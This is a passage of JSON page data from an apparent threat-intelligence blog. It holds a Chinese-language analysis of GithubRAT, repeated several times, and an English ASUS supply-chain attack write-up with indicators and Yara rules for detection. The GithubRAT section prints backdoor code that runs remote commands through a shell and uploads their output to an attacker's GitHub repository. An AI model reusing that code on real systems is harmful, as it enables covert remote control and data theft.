{"pageProps":{"post":{"publish":true,"enable_form":false,"tags":[{"_id":"5ecf890dfedd7f004b26978e","name":"APT","createdAt":"2020-05-28T09:49:01.076Z","updatedAt":"2020-10-14T03:41:17.235Z","__v":0,"id":"5ecf890dfedd7f004b26978e"},{"_id":"5fd6bb15af135000464926d8","name":"Lazarus","createdAt":"2020-12-14T01:08:37.024Z","updatedAt":"2020-12-14T01:08:37.024Z","__v":0,"id":"5fd6bb15af135000464926d8"},{"_id":"5fd6bb1daf135000464926d9","name":"MovieRAT","createdAt":"2020-12-14T01:08:45.113Z","updatedAt":"2020-12-14T01:08:45.113Z","__v":0,"id":"5fd6bb1daf135000464926d9"},{"_id":"5fd6bb3aaf135000464926db","name":"macOS","createdAt":"2020-12-14T01:09:14.200Z","updatedAt":"2020-12-14T01:09:14.200Z","__v":0,"id":"5fd6bb3aaf135000464926db"},{"_id":"5fd6bb25af135000464926da","name":"虛擬貨幣","createdAt":"2020-12-14T01:08:53.094Z","updatedAt":"2020-12-14T01:08:53.094Z","__v":0,"id":"5fd6bb25af135000464926da"}],"relative_posts":[{"publish":true,"enable_form":false,"tags":[{"_id":"5f30c347163518003f86daa6","name":"Github","createdAt":"2020-08-10T03:47:19.522Z","updatedAt":"2020-08-10T03:47:19.522Z","__v":0,"posts":[{"publish":true,"enable_form":false,"tags":["5f30c347163518003f86daa6","5f30c34c163518003f86daa7","5ecf8956fedd7f004b269791","5ecf890dfedd7f004b26978e"],"relative_posts":["5fd1cef79f8bdc004a7fdf4a"],"_id":"5f301d4c163518003f86da78","post_url":"Introducing-githubrat-malware-using-github-as-c2-server","post_name":"Github 不再只是版控平台，還是 APT 後門中繼站","publish_date":"2020-08-13T02:30:00.000Z","contents":[{"locale":"tw","_id":"5f301d4c163518003f86da79","context":"圖片來源：[Unsplash](https://unsplash.com/photos/Bb_X4JgSqIM)\n\n## 前言\nTeamT5 近期於台灣某政府機關發現駭客入侵事件，駭客於受害端點上植入遠端控制程式（Remote Access Tool, RAT）。特別之處在於，駭客透過 GitHub 雲端服務做為中繼站，藉此規避網路閘道端資安設備的偵測與攔阻。下圖為該受害主機向中繼站報到時，所回傳的端點資訊，可清楚看出該端點的域名為台灣政府機關。\n\n![202008-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022323/202008-1_2e7fc527df.png)\n_圖一、台灣某政府單位受駭_\n\n## 技術分析\nTeamT5 分析此 GithubRAT 後門程式，發現原為 Python Script，透過 PyInstaller 封裝為 Windows 執行檔。\n\nGithubRAT 執行後，會透過 api.github.com 連線至駭客的 Github 專案（Repository），並將駭客下達指令的結果回傳至 Github 專案上，其檔名為 Base64 編碼後的受害電腦名稱，網路封包如下圖所示。\n\n![202008-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-2_6b4b387c8f.png)\n_圖二、GithubRAT 使用 api.github.com 作為惡意中繼站_\n\n<br>\n\nTeamT5 分析 GithubRAT 惡意程式運作原理，將其執行步驟拆解如下：\n\n 1. 連線至駭客的 Github 專案，如下所示。\n \n    ```\n    def __init__(self):\n        self.back_git_heart = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_HEART, self.back_sid)\n        self.back_git_cmd = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_CMD, self.back_sid)\n        self.back_git_answer = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_ANSWER, self.back_sid)\n        self.back_git_token = 'https://api.github.com/repos/{}/{}/contents/{}/{}'.format(B_USER, B_PROJECT, B_PATH, 'token')\n     ```\n \n 2. 將電腦名稱透過 Base64 編碼並註冊回傳至 Github 專案中。\n 3. 從 Github 專案下載駭客的控制指令。\n 4. 利用命令提示字元 cmd.exe 執行駭客指令，如下所示。\n\n     ```\n    def back_cmd(self, command):\n        _t_data = 'timeout'\n        p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\n        _t = 10\n        while _t > 0:\n            time.sleep(1)\n            if p.poll() == 0:\n                _t_data = p.stdout.read() + p.stderr.read()\n                break\n            _t = _t - 1\n        return _t_data\n    ```\n \n 5. 將指令執行之結果回傳至 Github 專案中，如下所示。\n\n ```\n def _put_git_answer(self, data):\n    _result_status = False\n    _status, _sha = self._get_git_hash(self.back_git_answer)\n    d = {'message': 'my commit message',\n       'content': base64.b64encode(data),\n       'sha': _sha\n       }\n    headers = {'Authorization': 'token ' + B_TOKEN,'user-agent': B_USER_AGENT}\n    try:\n        r = requests.put(url=self.back_git_answer, data=json.dumps(d), headers=headers)\n        if not _status and r.status_code == 201:\n            _result_status = True\n        if _sha and r.status_code == 200:\n            _result_status = True\n    except Exception as e:\n        pass\n    return _result_status\n ```\n \n 6. 不斷重複步驟 3 至步驟 5。\n\n<br>\n\n另外，我們也發現駭客放置許多惡意程式於該 Github 專案中，其中包含密碼竊取（Password Dump）、漏洞利用（Exploit）及後門（Backdoor）等惡意程式，其詳細清單如下表所示。\n\n|Hash|說明|\n|---|---|\n|a5f12ee032af8e8dd5a373f611f64726|Backdoor Loader|\n|944465a0edd09d8eb569630a68ee111c|Cobalt Strike Payload|\n|e5ed0de0100f670324202bbf5982a80a|Cobalt Strike  Payload|\n|4f67e80118dcc4a42ebcb2af2cad65ce|Hacktool，CVE-2014-4113 Exploit|\n|0468a816c167ca5ad301dc408eb19fb5|HackTool，Chrome Password Dump|\n|b33c7c022e1a25a981faabfc0fe53f6d|HackTool，AD Password Brute-Force Tool|\n|5178eb048ecaed83b69aa277a7c6d784|HackTool，NETBIOS NameServer Scanner|\n|2f9b582378c559ca66b48abd51f436a0|HackTool，TCP Port Banner Scanner|\n|aad8b062891c0715a1842270c0a871eb|HackTool，MS-17-010 Eternalblue Scanner|\n|41e32076f2e75181ce9f1cac6099a918|HackTool，MS-17-010 Eternalblue Scanner|\n|1a41f9550964ada62f87f6a0b79e37ba|HackTool，NETBIOS NameServer Scanner|\n_表一、駭客 GitHub 專案中的惡意程式列表_\n\n## 影響與建議\n由於許多單位都會使用 Github 服務作為版本控制之用，因此對 Github 的存取都會是許可的狀態，這也變成駭客反過來利用的機制。駭客利用大眾對於雲端服務的需求，轉而透過該雲端服務作為中繼站，遠端控制受害電腦。同時，該 GithubRAT 係透過 PyInstaller 進行封裝，駭客使用其他封裝工具即可快速改變檔案雜湊值，因此 TeamT5 建議可透過網路連線紀錄來威脅狩獵（Threat Hunting），找尋環境內是否有密集且定期的 api.github.com 連線紀錄，藉此找出環境中異常的網路存取連線。\n\n最後，若單位遭遇進階持續性威脅（Advanced Persistent Threat, APT）時，建議可使用 TeamT5 的 ThreatSonar 惡意威脅鑑識分析平臺，可有效偵測此類進階攻擊手法，並快速完成事件關聯與回應。TeamT5 建議可將下方威脅指標（Indicator of Compromise, IOC）匯入各式資安設備中，強化威脅偵測與識別。\n\n* 表一中所有的惡意程式雜湊值\n* Yara Rule\n\n```\nrule RAT_Github\n{\n    meta:\n        description= \"detecting GithubRAT memory\"\n        author = \"TeamT5\"\n        date = \"2020-08-05\"\n    \n    strings:\n        $str1 = \"pyi-windows-manifest-filename\"\n        $str2 = \"https://api.github.com/repos/{}/{}/contents/{}/{}\"\n        $str3 = \"back_cmd\"\n        $str4 = \"put_git_answer\"       \n    \n        all of them\n}\n```\n\n![202008-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-3_222c942e82.png)\n_圖三、ThreatSonar 供資安人員快速匯入 Yara Rule 並自訂威脅等級_","title":"Github 不再只是版控平台，還是 APT 後門中繼站","createdAt":"2020-08-09T15:59:08.518Z","updatedAt":"2020-12-14T08:22:51.190Z","__v":0,"id":"5f301d4c163518003f86da79"}],"createdAt":"2020-08-09T15:59:08.292Z","updatedAt":"2021-01-27T04:40:39.819Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1597026081/brina-blum-Bb_X4JgSqIM-unsplash_8163042d8a.jpg","id":"5f301d4c163518003f86da78"}],"id":"5f30c347163518003f86daa6"},{"_id":"5f30c34c163518003f86daa7","name":"GithubRAT","createdAt":"2020-08-10T03:47:24.458Z","updatedAt":"2020-08-10T03:47:24.458Z","__v":0,"posts":[{"publish":true,"enable_form":false,"tags":["5f30c347163518003f86daa6","5f30c34c163518003f86daa7","5ecf8956fedd7f004b269791","5ecf890dfedd7f004b26978e"],"relative_posts":["5fd1cef79f8bdc004a7fdf4a"],"_id":"5f301d4c163518003f86da78","post_url":"Introducing-githubrat-malware-using-github-as-c2-server","post_name":"Github 不再只是版控平台，還是 APT 後門中繼站","publish_date":"2020-08-13T02:30:00.000Z","contents":[{"locale":"tw","_id":"5f301d4c163518003f86da79","context":"圖片來源：[Unsplash](https://unsplash.com/photos/Bb_X4JgSqIM)\n\n## 前言\nTeamT5 近期於台灣某政府機關發現駭客入侵事件，駭客於受害端點上植入遠端控制程式（Remote Access Tool, RAT）。特別之處在於，駭客透過 GitHub 雲端服務做為中繼站，藉此規避網路閘道端資安設備的偵測與攔阻。下圖為該受害主機向中繼站報到時，所回傳的端點資訊，可清楚看出該端點的域名為台灣政府機關。\n\n![202008-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022323/202008-1_2e7fc527df.png)\n_圖一、台灣某政府單位受駭_\n\n## 技術分析\nTeamT5 分析此 GithubRAT 後門程式，發現原為 Python Script，透過 PyInstaller 封裝為 Windows 執行檔。\n\nGithubRAT 執行後，會透過 api.github.com 連線至駭客的 Github 專案（Repository），並將駭客下達指令的結果回傳至 Github 專案上，其檔名為 Base64 編碼後的受害電腦名稱，網路封包如下圖所示。\n\n![202008-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-2_6b4b387c8f.png)\n_圖二、GithubRAT 使用 api.github.com 作為惡意中繼站_\n\n<br>\n\nTeamT5 分析 GithubRAT 惡意程式運作原理，將其執行步驟拆解如下：\n\n 1. 連線至駭客的 Github 專案，如下所示。\n \n    ```\n    def __init__(self):\n        self.back_git_heart = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_HEART, self.back_sid)\n        self.back_git_cmd = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_CMD, self.back_sid)\n        self.back_git_answer = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_ANSWER, self.back_sid)\n        self.back_git_token = 'https://api.github.com/repos/{}/{}/contents/{}/{}'.format(B_USER, B_PROJECT, B_PATH, 'token')\n     ```\n \n 2. 將電腦名稱透過 Base64 編碼並註冊回傳至 Github 專案中。\n 3. 從 Github 專案下載駭客的控制指令。\n 4. 利用命令提示字元 cmd.exe 執行駭客指令，如下所示。\n\n     ```\n    def back_cmd(self, command):\n        _t_data = 'timeout'\n        p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\n        _t = 10\n        while _t > 0:\n            time.sleep(1)\n            if p.poll() == 0:\n                _t_data = p.stdout.read() + p.stderr.read()\n                break\n            _t = _t - 1\n        return _t_data\n    ```\n \n 5. 將指令執行之結果回傳至 Github 專案中，如下所示。\n\n ```\n def _put_git_answer(self, data):\n    _result_status = False\n    _status, _sha = self._get_git_hash(self.back_git_answer)\n    d = {'message': 'my commit message',\n       'content': base64.b64encode(data),\n       'sha': _sha\n       }\n    headers = {'Authorization': 'token ' + B_TOKEN,'user-agent': B_USER_AGENT}\n    try:\n        r = requests.put(url=self.back_git_answer, data=json.dumps(d), headers=headers)\n        if not _status and r.status_code == 201:\n            _result_status = True\n        if _sha and r.status_code == 200:\n            _result_status = True\n    except Exception as e:\n        pass\n    return _result_status\n ```\n \n 6. 不斷重複步驟 3 至步驟 5。\n\n<br>\n\n另外，我們也發現駭客放置許多惡意程式於該 Github 專案中，其中包含密碼竊取（Password Dump）、漏洞利用（Exploit）及後門（Backdoor）等惡意程式，其詳細清單如下表所示。\n\n|Hash|說明|\n|---|---|\n|a5f12ee032af8e8dd5a373f611f64726|Backdoor Loader|\n|944465a0edd09d8eb569630a68ee111c|Cobalt Strike Payload|\n|e5ed0de0100f670324202bbf5982a80a|Cobalt Strike  Payload|\n|4f67e80118dcc4a42ebcb2af2cad65ce|Hacktool，CVE-2014-4113 Exploit|\n|0468a816c167ca5ad301dc408eb19fb5|HackTool，Chrome Password Dump|\n|b33c7c022e1a25a981faabfc0fe53f6d|HackTool，AD Password Brute-Force Tool|\n|5178eb048ecaed83b69aa277a7c6d784|HackTool，NETBIOS NameServer Scanner|\n|2f9b582378c559ca66b48abd51f436a0|HackTool，TCP Port Banner Scanner|\n|aad8b062891c0715a1842270c0a871eb|HackTool，MS-17-010 Eternalblue Scanner|\n|41e32076f2e75181ce9f1cac6099a918|HackTool，MS-17-010 Eternalblue Scanner|\n|1a41f9550964ada62f87f6a0b79e37ba|HackTool，NETBIOS NameServer Scanner|\n_表一、駭客 GitHub 專案中的惡意程式列表_\n\n## 影響與建議\n由於許多單位都會使用 Github 服務作為版本控制之用，因此對 Github 的存取都會是許可的狀態，這也變成駭客反過來利用的機制。駭客利用大眾對於雲端服務的需求，轉而透過該雲端服務作為中繼站，遠端控制受害電腦。同時，該 GithubRAT 係透過 PyInstaller 進行封裝，駭客使用其他封裝工具即可快速改變檔案雜湊值，因此 TeamT5 建議可透過網路連線紀錄來威脅狩獵（Threat Hunting），找尋環境內是否有密集且定期的 api.github.com 連線紀錄，藉此找出環境中異常的網路存取連線。\n\n最後，若單位遭遇進階持續性威脅（Advanced Persistent Threat, APT）時，建議可使用 TeamT5 的 ThreatSonar 惡意威脅鑑識分析平臺，可有效偵測此類進階攻擊手法，並快速完成事件關聯與回應。TeamT5 建議可將下方威脅指標（Indicator of Compromise, IOC）匯入各式資安設備中，強化威脅偵測與識別。\n\n* 表一中所有的惡意程式雜湊值\n* Yara Rule\n\n```\nrule RAT_Github\n{\n    meta:\n        description= \"detecting GithubRAT memory\"\n        author = \"TeamT5\"\n        date = \"2020-08-05\"\n    \n    strings:\n        $str1 = \"pyi-windows-manifest-filename\"\n        $str2 = \"https://api.github.com/repos/{}/{}/contents/{}/{}\"\n        $str3 = \"back_cmd\"\n        $str4 = \"put_git_answer\"       \n    \n        all of them\n}\n```\n\n![202008-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-3_222c942e82.png)\n_圖三、ThreatSonar 供資安人員快速匯入 Yara Rule 並自訂威脅等級_","title":"Github 不再只是版控平台，還是 APT 後門中繼站","createdAt":"2020-08-09T15:59:08.518Z","updatedAt":"2020-12-14T08:22:51.190Z","__v":0,"id":"5f301d4c163518003f86da79"}],"createdAt":"2020-08-09T15:59:08.292Z","updatedAt":"2021-01-27T04:40:39.819Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1597026081/brina-blum-Bb_X4JgSqIM-unsplash_8163042d8a.jpg","id":"5f301d4c163518003f86da78"}],"id":"5f30c34c163518003f86daa7"},{"_id":"5ecf8956fedd7f004b269791","name":"C2","createdAt":"2020-05-28T09:50:14.914Z","updatedAt":"2020-05-28T09:50:14.914Z","__v":0,"posts":[{"publish":false,"enable_form":false,"tags":["5ecf88f2fedd7f004b26978b","5ecf8956fedd7f004b269791","5ecf8973fedd7f004b269792","5ecf88fdfedd7f004b26978c"],"relative_posts":[],"_id":"5ecab33b602fc9004047603e","post_url":"asus-supply-chain-attack-a-technical-look-inside","post_name":"ASUS Supply-Chain Attack: A Technical Look Inside","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342261/startup-593324_1920_2fcd2ea5f0.jpg","contents":[{"locale":"en","_id":"5ecab33b602fc9004047603f","title":"ASUS Supply-Chain Attack: A Technical Look Inside","context":"photo courtesy of: pixabay.com\n\nAsus, one of the world's largest computer makers, was believed to be the newest victim of a supply chain attack. According to the up-to-date blog of Kaspersky [1], ASUS Live Software Server was compromised by attackers to install malicious backdoors on customers' devices.\n\nIt was alleged that the malware was delivered to millions of Asus computers, although the attackers targeted only 600 specific MAC addresses. This phenomenon has been observed in several supply chain attacks associated with China-backed APT actors, such as CCleaner and NetSarang supply chain attacks in 2017.\n\nTeamT5 found several samples of this serial attack and performed technical analysis on it. The C2 is https://asushotfix[.]com, which was shut down during our analysis. Thus, we are not able to provide further information at this time.\n\n![Figure 1: Shellcode encoding routine in ASUS sample, which is the same in PlugX Fast version](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_01_85f232f25d.png \"Figure 1: Shellcode encoding routine in ASUS sample, which is the same in PlugX Fast version\")\n_Figure 1: Shellcode encoding routine in ASUS sample, which is the same in PlugX Fast version_\n\nThe result indicates this attack was possibly carried out by Chinese hackers since they used PlugX Crypt for the shellcode derived from the file. Besides, TeamT5 observed several similar techniques between this attack and the previous cases, such as inserting malicious shellcode in the run-time initialization routine in C program. TeamT5 strongly believes that this supply chain attack on ASUS system was backed by China government and can be linked to the CCleaner and NetSarang attacks.\n\nFrom the C2 domain activation history, TeamT5 believes the initial campaign started from May 2018 and ended in around Oct 2018. However, the computers in the target list will be implanted with other malwares and keep being controlled by the threat actors. The only knowledge regarding the targets is a list of MAC address hashes and they could not be mapped to organizations or individuals. We urge our clients to check the IDS/IPS or try to use TeamT5's ThreatSonar to scan for further detection and defence.\n\n### Reference\n\n[1] https://securelist.com/operation-shadowhammer/89992/\n\n#### **Appendix**\n\nIndicator of Compromise (IoC)\n\n**C2 Domains and IPs:**\n\n* asushotfix[.]com\n* simplexoj[.]com\n* homeabcd[.]com\n* 35.154.92[.]115\n* 141.105.71[.]116\n\n**Malicious download links:**\n\n* hxxp://liveupdate01.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER365.zip\n* hxxps://liveupdate01s.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER362.zip\n* hxxps://liveupdate01s.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER360.zip\n* hxxps://liveupdate01s.asus[.]com/pub/ASUS/nb/Apps_for_Win8/LiveUpdate/Liveupdate_Test_VER359.zip\n\nHashes (MD5) :\n\n* 5855362028a58d8760c9ea2dcdf37af5\n* 0db57cc899ae7385c60b16a62b748a18\n* c0116d877d048b1ba87c0de6fd7c3fb2\n* 7df9736f60a979eee5b90d6c53dc9374\n* 56a046f11c84c691295267dcf1f00c4a\n* fa83ffde24f149f9f6d1d8bc05c0e023\n* 17a36ac3e31f3a18936552aff2c80249\n* 2a95475af7a07ee95ab11caad9e99b0c\n* 0f49621b06f2cdaac8850c6e9581a594\n* f2f879989d967e03b9ea0938399464ab\n* 06c19cd73471f0db027ab9eb85edc607\n* 63f2fe96de336b6097806b22b5ab941a\n* 9c74402572344aee9018587188fe441e\n* bd809a2abb1eda0e28becc1661b96581\n* 8baa46d0e0faa2c6a3f20aeda2556b18\n* cdb0a09067877f30189811c7aea3f253\n* aa15eb28292321b586c27d8401703494\n* 8756bafa7f0a9764311d52bc792009f9\n* 2ec9d0df80df005becbd37142811e43b\n* 55a7aa5f0e52ba4d78c145811c830107\n* 915086d90596eb5903bcd5b02fd97e3e\n* 5220c683de5b01a70487dac2440e0ecb\n* 5855ce7c4a3167f0e006310eb1c76313\n\n**Thumbprint of abused certificate:**\n\n* 626646d29c5b0e7c53aa84698a4a97be323cf17f\n\nYara rule:\n\n```yara\nrule apt_trojan_AsusSetup_encoder\n{\n  strings:\n    $plugx_crypt = { 55 8BEC 81EC 08010000 53 56 57 8DBD F8FEFFFF B9 42000000 B8 CCCCCCCC F3 AB C745 F8 00000000 C745 EC 00000000 8B45 08 8B08 894D E0 8B45 08 8B08 894D D4 8B45 08 8B08 894D C8 8B45 08 8B08 894D BC 8B45 E0 C1E8 03 8B4D E0 8D9401 EFEEEEEE 8955 E0 8B45 D4 C1E8 05 8B4D D4 8D9401 DEDDDDDD 8955 D4 8B45 C8 C1E0 07 B9 33333333 2BC8 034D C8 894D C8 8B45 BC C1E0 09 B9 44444444 2BC8 034D BC 894D EC 8B45 EC 8945 BC 8B45 08 0345 F8 0FB608 8B55 E0 81E2 FF000000 0FB6C2 8B55 D4 81E2 FF000000 0FB6D2 03C2 8B55 C8 81E2 FF000000 0FB6D2 03C2 8B55 EC 81E2 FF000000 0FB6D2 03C2 33C8 8B45 10 0345 F8 8808 8B45 F8 83C0 01 8945 F8 8B45 F8 3B45 0C 0F8C 50FFFFFF 5F 5E 5B 8BE5 5D C2 0C00 }\n\n  condition:\n    all of them\n}\n\nrule apt_trojan_AsusSetup_memory\n{\n  strings:\n    $plugx_crypt = { 55 8BEC 81EC 08010000 53 56 57 8DBD F8FEFFFF B9 42000000 B8 CCCCCCCC F3 AB C745 F8 00000000 C745 EC 00000000 8B45 08 8B08 894D E0 8B45 08 8B08 894D D4 8B45 08 8B08 894D C8 8B45 08 8B08 894D BC 8B45 E0 C1E8 03 8B4D E0 8D9401 EFEEEEEE 8955 E0 8B45 D4 C1E8 05 8B4D D4 8D9401 DEDDDDDD 8955 D4 8B45 C8 C1E0 07 B9 33333333 2BC8 034D C8 894D C8 8B45 BC C1E0 09 B9 44444444 2BC8 034D BC 894D EC 8B45 EC 8945 BC 8B45 08 0345 F8 0FB608 8B55 E0 81E2 FF000000 0FB6C2 8B55 D4 81E2 FF000000 0FB6D2 03C2 8B55 C8 81E2 FF000000 0FB6D2 03C2 8B55 EC 81E2 FF000000 0FB6D2 03C2 33C8 8B45 10 0345 F8 8808 8B45 F8 83C0 01 8945 F8 8B45 F8 3B45 0C 0F8C 50FFFFFF 5F 5E 5B 8BE5 5D C2 0C00 }\n\n  condition:\n    all of them\n}\n```\n\n#### How to use IOC in ThreatSonar\n\nA. You can import IOCs into ThreatSonar and launch \"Retro Hunt\" to see if there is any matches.\n\n![Import IOC into ThreatSonar Intel.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_02_4ceec82521.png \"Import IOC into ThreatSonar Intel.\")\n_Import IOC into ThreatSonar Intel._\n\nB. The malware is using valid \"ASUSTek\" certificate, the thumbprint of the certificate can be searched in \"Hunter\" page.\n\n![Details of abused certificate.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_03_0dce4b9764.png \"Details of abused certificate.\")\n_Details of abused certificate._\n\nIn \"Hunter\" page, you are able to search \"thumbprint = 626646d29c5b0e7c53aa84698a4a97be323cf17f\" by switching scope to \"Certificate\" (Please select \"Engine Version\" to All).\n\nP.S. If you find any matched results, don’t hesitate to contact with us.\n\n![Thumbprint matched endpoints and programs.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342320/02_04_380dc77e41.png \"Thumbprint matched endpoints and programs.\")\n_Thumbprint matched endpoints and programs._\n![The related thumbprint was found.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342398/02_05_6dfb694a3a.png \"The related thumbprint was found.\")\n_The related thumbprint was found._\n\nC. To use the yara rule, just create yara ruleset, then copy and paste the yara rule listed above.\n\n![Import the yara rule.](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342321/02_06_a1dfcf5ab0.png \"Import the yara rule.\")\n_Import the yara rule._\n","createdAt":"2020-05-24T17:47:39.800Z","updatedAt":"2020-07-02T08:45:53.754Z","__v":0,"id":"5ecab33b602fc9004047603f"}],"createdAt":"2020-05-24T17:47:39.794Z","updatedAt":"2020-07-02T08:45:53.779Z","__v":1,"topic":"5ecaa004a792d70040a0d8b0","author":null,"publish_date":"2019-03-28T04:00:00.000Z","id":"5ecab33b602fc9004047603e"},{"publish":true,"enable_form":false,"tags":["5f30c347163518003f86daa6","5f30c34c163518003f86daa7","5ecf8956fedd7f004b269791","5ecf890dfedd7f004b26978e"],"relative_posts":["5fd1cef79f8bdc004a7fdf4a"],"_id":"5f301d4c163518003f86da78","post_url":"Introducing-githubrat-malware-using-github-as-c2-server","post_name":"Github 不再只是版控平台，還是 APT 後門中繼站","publish_date":"2020-08-13T02:30:00.000Z","contents":[{"locale":"tw","_id":"5f301d4c163518003f86da79","context":"圖片來源：[Unsplash](https://unsplash.com/photos/Bb_X4JgSqIM)\n\n## 前言\nTeamT5 近期於台灣某政府機關發現駭客入侵事件，駭客於受害端點上植入遠端控制程式（Remote Access Tool, RAT）。特別之處在於，駭客透過 GitHub 雲端服務做為中繼站，藉此規避網路閘道端資安設備的偵測與攔阻。下圖為該受害主機向中繼站報到時，所回傳的端點資訊，可清楚看出該端點的域名為台灣政府機關。\n\n![202008-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022323/202008-1_2e7fc527df.png)\n_圖一、台灣某政府單位受駭_\n\n## 技術分析\nTeamT5 分析此 GithubRAT 後門程式，發現原為 Python Script，透過 PyInstaller 封裝為 Windows 執行檔。\n\nGithubRAT 執行後，會透過 api.github.com 連線至駭客的 Github 專案（Repository），並將駭客下達指令的結果回傳至 Github 專案上，其檔名為 Base64 編碼後的受害電腦名稱，網路封包如下圖所示。\n\n![202008-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-2_6b4b387c8f.png)\n_圖二、GithubRAT 使用 api.github.com 作為惡意中繼站_\n\n<br>\n\nTeamT5 分析 GithubRAT 惡意程式運作原理，將其執行步驟拆解如下：\n\n 1. 連線至駭客的 Github 專案，如下所示。\n \n    ```\n    def __init__(self):\n        self.back_git_heart = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_HEART, self.back_sid)\n        self.back_git_cmd = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_CMD, self.back_sid)\n        self.back_git_answer = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_ANSWER, self.back_sid)\n        self.back_git_token = 'https://api.github.com/repos/{}/{}/contents/{}/{}'.format(B_USER, B_PROJECT, B_PATH, 'token')\n     ```\n \n 2. 將電腦名稱透過 Base64 編碼並註冊回傳至 Github 專案中。\n 3. 從 Github 專案下載駭客的控制指令。\n 4. 利用命令提示字元 cmd.exe 執行駭客指令，如下所示。\n\n     ```\n    def back_cmd(self, command):\n        _t_data = 'timeout'\n        p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\n        _t = 10\n        while _t > 0:\n            time.sleep(1)\n            if p.poll() == 0:\n                _t_data = p.stdout.read() + p.stderr.read()\n                break\n            _t = _t - 1\n        return _t_data\n    ```\n \n 5. 將指令執行之結果回傳至 Github 專案中，如下所示。\n\n ```\n def _put_git_answer(self, data):\n    _result_status = False\n    _status, _sha = self._get_git_hash(self.back_git_answer)\n    d = {'message': 'my commit message',\n       'content': base64.b64encode(data),\n       'sha': _sha\n       }\n    headers = {'Authorization': 'token ' + B_TOKEN,'user-agent': B_USER_AGENT}\n    try:\n        r = requests.put(url=self.back_git_answer, data=json.dumps(d), headers=headers)\n        if not _status and r.status_code == 201:\n            _result_status = True\n        if _sha and r.status_code == 200:\n            _result_status = True\n    except Exception as e:\n        pass\n    return _result_status\n ```\n \n 6. 不斷重複步驟 3 至步驟 5。\n\n<br>\n\n另外，我們也發現駭客放置許多惡意程式於該 Github 專案中，其中包含密碼竊取（Password Dump）、漏洞利用（Exploit）及後門（Backdoor）等惡意程式，其詳細清單如下表所示。\n\n|Hash|說明|\n|---|---|\n|a5f12ee032af8e8dd5a373f611f64726|Backdoor Loader|\n|944465a0edd09d8eb569630a68ee111c|Cobalt Strike Payload|\n|e5ed0de0100f670324202bbf5982a80a|Cobalt Strike  Payload|\n|4f67e80118dcc4a42ebcb2af2cad65ce|Hacktool，CVE-2014-4113 Exploit|\n|0468a816c167ca5ad301dc408eb19fb5|HackTool，Chrome Password Dump|\n|b33c7c022e1a25a981faabfc0fe53f6d|HackTool，AD Password Brute-Force Tool|\n|5178eb048ecaed83b69aa277a7c6d784|HackTool，NETBIOS NameServer Scanner|\n|2f9b582378c559ca66b48abd51f436a0|HackTool，TCP Port Banner Scanner|\n|aad8b062891c0715a1842270c0a871eb|HackTool，MS-17-010 Eternalblue Scanner|\n|41e32076f2e75181ce9f1cac6099a918|HackTool，MS-17-010 Eternalblue Scanner|\n|1a41f9550964ada62f87f6a0b79e37ba|HackTool，NETBIOS NameServer Scanner|\n_表一、駭客 GitHub 專案中的惡意程式列表_\n\n## 影響與建議\n由於許多單位都會使用 Github 服務作為版本控制之用，因此對 Github 的存取都會是許可的狀態，這也變成駭客反過來利用的機制。駭客利用大眾對於雲端服務的需求，轉而透過該雲端服務作為中繼站，遠端控制受害電腦。同時，該 GithubRAT 係透過 PyInstaller 進行封裝，駭客使用其他封裝工具即可快速改變檔案雜湊值，因此 TeamT5 建議可透過網路連線紀錄來威脅狩獵（Threat Hunting），找尋環境內是否有密集且定期的 api.github.com 連線紀錄，藉此找出環境中異常的網路存取連線。\n\n最後，若單位遭遇進階持續性威脅（Advanced Persistent Threat, APT）時，建議可使用 TeamT5 的 ThreatSonar 惡意威脅鑑識分析平臺，可有效偵測此類進階攻擊手法，並快速完成事件關聯與回應。TeamT5 建議可將下方威脅指標（Indicator of Compromise, 